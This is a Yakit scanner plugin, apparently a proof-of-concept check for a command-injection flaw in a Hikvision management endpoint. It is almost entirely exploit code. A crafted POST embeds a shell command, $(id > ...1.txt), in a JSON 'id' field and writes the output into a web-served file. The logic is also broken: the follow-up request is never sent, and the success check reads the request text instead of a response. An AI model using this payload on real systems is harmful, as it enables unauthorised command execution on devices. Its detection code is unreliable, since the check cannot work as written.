script_name: 海康detection远程命令执行漏洞
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /center/api/installation/detection HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Content-Length: 148

{"type": "environment", "operate": "", "machines": {"id": "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}

`

	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
	resp_time=time.Since(begin_time)

	packet2 = `GET /vms/static/1.txt HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
`
    if str.MatchAllOfSubString(packet2, 'HTTP/1.1 200','uid='){
        yakit.Info("%v found 海康detection远程命令执行漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("海康detection远程命令执行漏洞"),
        risk.severity("high"),
        risk.titleVerbose("海康detection远程命令执行漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
